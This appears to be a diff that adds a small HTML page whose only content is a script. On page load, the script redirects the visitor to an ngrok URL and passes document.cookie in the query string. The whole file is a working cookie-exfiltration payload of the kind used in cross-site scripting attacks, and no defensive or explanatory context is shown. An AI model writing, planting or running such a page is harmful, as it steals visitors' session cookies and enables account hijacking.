@@ -1,0 +1,7 @@
+<html>
+<head>
+<script>
+document.location="https://467f6190c7e9.ngrok.io/?cookie="+document.cookie;
+</script>
+<body></body>
+</html>
